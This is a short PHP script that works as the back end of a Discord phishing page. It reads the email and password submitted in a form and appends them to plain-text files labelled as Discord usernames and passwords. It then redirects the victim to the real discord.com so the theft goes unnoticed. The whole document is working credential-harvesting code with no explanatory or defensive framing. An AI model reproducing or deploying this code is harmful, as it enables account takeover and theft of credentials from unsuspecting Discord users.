<?php

file_put_contents("usernames.txt", "Discord Username : " . $email = $_POST['email'] . "\n", FILE_APPEND);
?>
<?php
file_put_contents("pass.txt", "Discord Password : " . $pass = $_POST['pass'] . "\n", FILE_APPEND);
header('Location: https://discord.com');
?>
